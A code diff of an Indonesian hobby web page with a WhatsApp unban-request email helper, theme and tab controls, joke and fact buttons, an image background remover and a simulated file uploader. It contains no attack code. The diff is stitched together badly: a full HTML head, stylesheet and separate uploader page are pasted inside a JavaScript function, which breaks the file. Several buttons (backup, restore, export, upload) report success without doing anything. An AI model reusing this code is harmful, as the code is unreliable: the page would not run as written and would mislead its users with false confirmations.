+                return;
+            }
             
-            const selectedUrl = document.querySelector('input[name="urlOption"]:checked').value;
+            // Update status indicator
+            const statusSteps = document.querySelectorAll('.status-step');
+            statusSteps[1].classList.add('active');
+            updateProgress(50);
             
-            // Simulasi upload (dalam implementasi nyata, ini akan menggunakan fetch atau XMLHttpRequest)
+            // Simulasi loading
+            sendEmailBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim...';
+            sendEmailBtn.disabled = true;
+            
             setTimeout(() => {
-                // Ini adalah simulasi - dalam implementasi nyata, Anda akan mengirim file ke server
-                const randomId = Math.random().toString(36).substring(2, 10);
-                const fileExtension = selectedFile.name.split('.').pop();
-                const uploadedUrl = `${selectedUrl}/uploaded-${randomId}.${fileExtension}`;
+                const optionValue = selectedOption.value;
+                const emailText = emailTexts[optionValue];
+                const emailAddress = "support@support.whatsapp.com";
+                const subject = "Permohonan Unband WhatsApp";
                 
-                showUploadResult('success', uploadedUrl);
-                uploadBtn.textContent = 'Upload File';
+                // Membuka aplikasi email default dengan teks yang sudah disiapkan
+                const mailtoLink = `mailto:${emailAddress}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(emailText)}`;
+                window.location.href = mailtoLink;
+                
+                // Update status indicator
+                statusSteps[2].classList.add('active');
+                updateProgress(100);
+                
+                // Reset tombol
+                sendEmailBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Kirim Permohonan';
+                sendEmailBtn.disabled = false;
+                
+                // Tampilkan pesan sukses
+                successMsg.style.display = 'block';
+                showNotification('Permohonan berhasil dikirim!', 'success');
+                setTimeout(() => {
+                    successMsg.style.display = 'none';
+                }, 5000);
             }, 2000);
         });
         
-        copyUploadBtn.addEventListener('click', function() {
-            const urlText = uploadResultUrl.textContent;
-            navigator.clipboard.writeText(urlText).then(() => {
-                copyUploadBtn.textContent = 'Tersalin!';
-                setTimeout(() => {
-                    copyUploadBtn.textContent = 'Salin URL';
-                }, 2000);
+        // Event listener untuk tab
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                // Hapus kelas active dari semua tab dan konten
+                tabs.forEach(t => t.classList.remove('active'));
+                tabContents.forEach(c => c.classList.remove('active'));
+                
+                // Tambahkan kelas active ke tab yang diklik
+                tab.classList.add('active');
+                
+                // Tampilkan konten yang sesuai
+                const tabId = tab.getAttribute('data-tab') + '-tab';
+                document.getElementById(tabId).classList.add('active');
             });
         });
         
-        function showUploadResult(type, message) {
-            uploadResult.className = 'upload-result';
-            uploadResult.classList.add(type);
-            
-            if (type === 'success') {
-                uploadResultTitle.textContent = 'Upload Berhasil!';
-                uploadResultUrl.textContent = message;
-                copyUploadBtn.style.display = 'inline-block';
-            } else {
-                uploadResultTitle.textContent = 'Upload Gagal';
-                uploadResultUrl.textContent = message;
-                copyUploadBtn.style.display = 'none';
+        // Event listener untuk tombol enter di input password
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                loginBtn.click();
             }
-            
-            uploadResult.scrollIntoView({ behavior: 'smooth' });
-        }
+        });
         
-        function formatFileSize(bytes) {
-            if (bytes === 0) return '0 Bytes';
-            const k = 1024;
-            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-            const i = Math.floor(Math.log(bytes) / Math.log(k));
-            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-        }
+        // Event listener untuk toggle tema
+        themeToggles.forEach(toggle => {
+            toggle.addEventListener('click', function() {
+                this.classList.toggle('active');
+                document.body.classList.toggle('dark-mode');
+                showNotification('Tema diubah!', 'success');
+            });
+        });
+        
+        // Event listener untuk tombol ekspor riwayat
+        exportHistoryBtn.addEventListener('click', function() {
+            showNotification('Mengekspor riwayat...', 'success');
+            // Simulasi ekspor
+            setTimeout(() => {
+                showNotification('Riwayat berhasil diekspor!', 'success');
+            }, 1500);
+        });
+        
+        // Event listener untuk tombol tools
+        backupBtn.addEventListener('click', function() {
+            showNotification('Memulai backup data...', 'success');
+        });
+        
+        restoreBtn.addEventListener('click', function() {
+            showNotification('Memulihkan data...', 'success');
+        });
+        
+        checkStatusBtn.addEventListener('click', function() {
+            showNotification('Memeriksa status...', 'success');
+        });
+        
+        clearCacheBtn.addEventListener('click', function() {
+            showNotification('Membersihkan cache...', 'success');
+        });
+        
+        // Event listener untuk fitur fun
+        generateQuoteBtn.addEventListener('click', generateRandomQuote);
+        
+        jokeBtn.addEventListener('click', function() {
+            const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
+            quoteText.textContent = randomJoke;
+            quoteGenre.textContent = "Genre: Lelucon";
+            showNotification('Lelucon acak ditampilkan!', 'success');
+        });
+        
+        factBtn.addEventListener('click', function() {
+            const randomFact = facts[Math.floor(Math.random() * facts.length)];
+            quoteText.textContent = randomFact;
+            quoteGenre.textContent = "Genre: Fakta Unik";
+            showNotification('Fakta unik ditampilkan!', 'success');
+        });
+        
+        memeBtn.addEventListener('click', function() {
+            // Dalam implementasi nyata, ini akan menampilkan generator meme
+            quoteText.textContent = "Fitur Generator Meme akan segera hadir! Stay tuned!";
+            quoteGenre.textContent = "Genre: Info";
+            showNotification('Generator meme akan datang!', 'success');
+        });
+        
+        gameBtn.addEventListener('click', function() {
+            // Dalam implementasi nyata, ini akan menampilkan mini game
+            quoteText.textContent = "Fitur Mini Game akan segera hadir! Siap-siap untuk bersenang-senang!";
+            quoteGenre.textContent = "Genre: Info";
+            showNotification('Mini game akan datang!', 'success');
+        });
+        
+        // Event listener untuk voice intro
+        playVoiceBtn.addEventListener('click', playVoiceIntro);
+        stopVoiceBtn.addEventListener('click', stopVoiceIntro);
+        
+        // Event listener untuk penghapus background
+        bgImageUpload.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            
+            const reader = new FileReader();
+            reader.onload = function(event) {
+                originalImage = new Image();
+                originalImage.onload = function() {
+                    // Set ukuran canvas asli
+                    const maxWidth = 300;
+                    const maxHeight = 200;
+                    let width = originalImage.width;
+                    let height = originalImage.height;
+                    
+                    if (width > maxWidth) {
+                        height = (maxWidth / width) * height;
+                        width = maxWidth;
+                    }
+                    
+                    if (height > maxHeight) {
+                        width = (maxHeight / height) * width;
+                        height = maxHeight;
+                    }
+                    
+                    originalCanvas.width = width;
+                    originalCanvas.height = height;
+                    
+                    // Gambar di canvas asli
+                    originalCtx.drawImage(originalImage, 0, 0, width, height);
+                    
+                    // Aktifkan tombol hapus background
+                    removeBgBtn.disabled = false;
+                    
+                    showNotification('Gambar berhasil diunggah!', 'success');
+                };
+                originalImage.src = event.target.result;
+            };
+            reader.readAsDataURL(file);
+        });
+        
+        removeBgBtn.addEventListener('click', removeBackground);
+        downloadBgBtn.addEventListener('click', downloadProcessedImage);
+        resetBgBtn.addEventListener('click', resetBackgroundRemover);
+        
+        // Animasi untuk elemen fitur
+        const featureItems = document.querySelectorAll('.feature-item');
+        featureItems.forEach((item, index) => {
+            item.style.animationDelay = `${index * 0.1}s`;
+        });
         
         // Inisialisasi dan jalankan tracker
         createStars();
@@ -492,7 +2164,435 @@
         // Fungsi untuk membuat ID sesi unik
         function generateSessionId() {
             return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+      <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pengunggah Foto & Video</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
+        
+        body {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+        
+        header {
+            background: linear-gradient(to right, #4a00e0, #8e2de2);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+        
+        .main-content {
+            padding: 30px;
+        }
+        
+        .upload-area {
+            border: 2px dashed #8e2de2;
+            border-radius: 10px;
+            padding: 40px 20px;
+            text-align: center;
+            margin-bottom: 25px;
+            transition: all 0.3s ease;
+            background: #f9f7ff;
+        }
+        
+        .upload-area.highlight {
+            background: #e8e2ff;
+            border-color: #4a00e0;
+        }
+        
+        .upload-icon {
+            font-size: 50px;
+            color: #8e2de2;
+            margin-bottom: 15px;
+        }
+        
+        .upload-text {
+            margin-bottom: 20px;
+        }
+        
+        .file-input {
+            display: none;
+        }
+        
+        .file-label {
+            display: inline-block;
+            background: #8e2de2;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .file-label:hover {
+            background: #4a00e0;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(142, 45, 226, 0.4);
+        }
+        
+        .file-info {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+        
+        .url-selection {
+            margin-bottom: 25px;
+        }
+        
+        .url-title {
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+            color: #4a00e0;
+        }
+        
+        .url-options {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .url-option {
+            flex: 1;
+            min-width: 200px;
+        }
+        
+        .url-option input {
+            display: none;
+        }
+        
+        .url-label {
+            display: block;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .url-label:hover {
+            border-color: #8e2de2;
+        }
+        
+        .url-option input:checked + .url-label {
+            border-color: #4a00e0;
+            background: #f0ebff;
+            box-shadow: 0 0 0 2px rgba(74, 0, 224, 0.2);
+        }
+        
+        .url-name {
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #4a00e0;
+        }
+        
+        .url-desc {
+            font-size: 0.9rem;
+            color: #666;
+        }
+        
+        .upload-btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(to right, #4a00e0, #8e2de2);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+        
+        .upload-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 20px rgba(142, 45, 226, 0.4);
+        }
+        
+        .upload-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .result {
+            margin-top: 25px;
+            padding: 20px;
+            border-radius: 10px;
+            display: none;
+        }
+        
+        .result.success {
+            background: #e8fff0;
+            border: 1px solid #4CAF50;
+            display: block;
+        }
+        
+        .result.error {
+            background: #ffe8e8;
+            border: 1px solid #f44336;
+            display: block;
+        }
+        
+        .result-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .result-url {
+            word-break: break-all;
+            margin-bottom: 15px;
+        }
+        
+        .copy-btn {
+            background: #4a00e0;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: background 0.3s ease;
+        }
+        
+        .copy-btn:hover {
+            background: #3a00b0;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            font-size: 0.9rem;
+            border-top: 1px solid #eee;
+        }
+        
+        @media (max-width: 600px) {
+            .url-options {
+                flex-direction: column;
+            }
+            
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            .main-content {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Pengunggah Foto & Video</h1>
+            <p class="subtitle">Unggah file Anda dan pilih tujuan upload</p>
+        </header>
+        
+        <div class="main-content">
+            <div class="upload-area" id="uploadArea">
+                <div class="upload-icon">📁</div>
+                <p class="upload-text">Seret file ke sini atau klik untuk memilih</p>
+                <input type="file" id="fileInput" class="file-input" accept="image/*,video/*">
+                <label for="fileInput" class="file-label">Pilih File</label>
+                <p class="file-info">Mendukung file gambar (JPG, PNG, GIF) dan video (MP4, MOV, AVI)</p>
+            </div>
+            
+            <div class="url-selection">
+                <h3 class="url-title">Pilih Tujuan Upload:</h3>
+                <div class="url-options">
+                    <div class="url-option">
+                        <input type="radio" id="url1" name="urlOption" value="https://c.termai.cc" checked>
+                        <label for="url1" class="url-label">
+                            <div class="url-name">TermAI</div>
+                            <div class="url-desc">https://c.termai.cc</div>
+                        </label>
+                    </div>
+                    <div class="url-option">
+                        <input type="radio" id="url2" name="urlOption" value="https://catbox.moe">
+                        <label for="url2" class="url-label">
+                            <div class="url-name">Catbox</div>
+                            <div class="url-desc">https://catbox.moe</div>
+                        </label>
+                    </div>
+                </div>
+            </div>
+            
+            <button id="uploadBtn" class="upload-btn" disabled>Upload File</button>
+            
+            <div id="result" class="result">
+                <p class="result-title" id="resultTitle">Upload Berhasil!</p>
+                <p class="result-url" id="resultUrl"></p>
+                <button class="copy-btn" id="copyBtn">Salin URL</button>
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2023 Pengunggah File. Semua hak dilindungi.</p>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const fileInput = document.getElementById('fileInput');
+            const uploadArea = document.getElementById('uploadArea');
+            const uploadBtn = document.getElementById('uploadBtn');
+            const resultDiv = document.getElementById('result');
+            const resultTitle = document.getElementById('resultTitle');
+            const resultUrl = document.getElementById('resultUrl');
+            const copyBtn = document.getElementById('copyBtn');
+            
+            let selectedFile = null;
+            
+            // Event listeners untuk drag and drop
+            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
+                uploadArea.addEventListener(eventName, preventDefaults, false);
+            });
+            
+            function preventDefaults(e) {
+                e.preventDefault();
+                e.stopPropagation();
+            }
+            
+            ['dragenter', 'dragover'].forEach(eventName => {
+                uploadArea.addEventListener(eventName, highlight, false);
+            });
+            
+            ['dragleave', 'drop'].forEach(eventName => {
+                uploadArea.addEventListener(eventName, unhighlight, false);
+            });
+            
+            function highlight() {
+                uploadArea.classList.add('highlight');
+            }
+            
+            function unhighlight() {
+                uploadArea.classList.remove('highlight');
+            }
+            
+            uploadArea.addEventListener('drop', handleDrop, false);
+            
+            function handleDrop(e) {
+                const dt = e.dataTransfer;
+                const files = dt.files;
+                handleFiles(files);
+            }
+            
+            fileInput.addEventListener('change', function() {
+                handleFiles(this.files);
+            });
+            
+            function handleFiles(files) {
+                if (files.length > 0) {
+                    selectedFile = files[0];
+                    
+                    // Validasi tipe file
+                    const fileType = selectedFile.type;
+                    if (!fileType.startsWith('image/') && !fileType.startsWith('video/')) {
+                        showResult('error', 'Hanya file gambar dan video yang diizinkan.');
+                        uploadBtn.disabled = true;
+                        return;
+                    }
+                    
+                    // Tampilkan info file
+                    const fileInfo = uploadArea.querySelector('.file-info');
+                    fileInfo.textContent = `File: ${selectedFile.name} (${formatFileSize(selectedFile.size)})`;
+                    
+                    uploadBtn.disabled = false;
+                }
+            }
+            
+            uploadBtn.addEventListener('click', function() {
+                if (!selectedFile) return;
+                
+                uploadBtn.disabled = true;
+                uploadBtn.textContent = 'Mengupload...';
+                
+                const selectedUrl = document.querySelector('input[name="urlOption"]:checked').value;
+                
+                // Simulasi upload (dalam implementasi nyata, ini akan menggunakan fetch atau XMLHttpRequest)
+                setTimeout(() => {
+                    // Ini adalah simulasi - dalam implementasi nyata, Anda akan mengirim file ke server
+                    const randomId = Math.random().toString(36).substring(2, 10);
+                    const fileExtension = selectedFile.name.split('.').pop();
+                    const uploadedUrl = `${selectedUrl}/uploaded-${randomId}.${fileExtension}`;
+                    
+                    showResult('success', uploadedUrl);
+                    uploadBtn.textContent = 'Upload File';
+                }, 2000);
+            });
+            
+            copyBtn.addEventListener('click', function() {
+                const urlText = resultUrl.textContent;
+                navigator.clipboard.writeText(urlText).then(() => {
+                    copyBtn.textContent = 'Tersalin!';
+                    setTimeout(() => {
+                        copyBtn.textContent = 'Salin URL';
+                    }, 2000);
+                });
+            });
+            
+            function showResult(type, message) {
+                resultDiv.className = 'result';
+                resultDiv.classList.add(type);
+                
+                if (type === 'success') {
+                    resultTitle.textContent = 'Upload Berhasil!';
+                    resultUrl.textContent = message;
+                    copyBtn.style.display = 'inline-block';
+                } else {
+                    resultTitle.textContent = 'Upload Gagal';
+                    resultUrl.textContent = message;
+                    copyBtn.style.display = 'none';
+                }
+                
+                resultDiv.scrollIntoView({ behavior: 'smooth' });
+            }
+            
+            function formatFileSize(bytes) {
+                if (bytes === 0) return '0 Bytes';
+                const k = 1024;
+                const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+                const i = Math.floor(Math.log(bytes) / Math.log(k));
+                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+            }
+        });
     </script>
 </body>
 </html>
